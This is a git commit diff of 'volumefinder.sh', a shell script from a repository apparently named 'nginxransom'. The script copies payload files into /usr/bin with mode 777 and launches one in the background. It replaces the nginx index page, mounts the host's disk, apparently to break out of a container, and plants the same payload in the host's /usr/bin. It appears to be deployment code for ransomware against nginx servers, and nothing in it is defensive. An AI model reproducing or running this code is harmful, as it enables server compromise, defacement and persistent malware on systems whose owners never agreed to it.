f63326b7a31f7f27cc6b0733886651302f676b51
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-05-13 01:01:31 +0300

    bootstarp-14

--- volumefinder.sh
+++ volumefinder.sh
@@ -2,15 +2,15 @@
 #apt update -y 
 #apt install git -y  
 #git clone https://github.com/xeroxpro/nginxransom.git
-cp  nginxransom/initialize.txt /usr/bin/initialize  
+cp   nginxransom/initialize.txt /usr/bin/initialize  
 chmod 777 /usr/bin/initialize 
 initialize &
 pwd  
-cp  /nginxransom/web/index.html /usr/share/nginx/html/index.html
+cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
-cp  /nginxransom/bootstarp.txt  /mnt/usr/bin/bootstarp 
-cp /nginxransom/bootstarp.txt /usr/bin/bootstarp 
+cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp 
+cp   nginxransom/bootstarp.txt /usr/bin/bootstarp 
 chmod 777 /usr/bin/bootstarp 
 chmod 777 /mnt/usr/bin/bootstarp 
 cd /mnt/usr/bin/
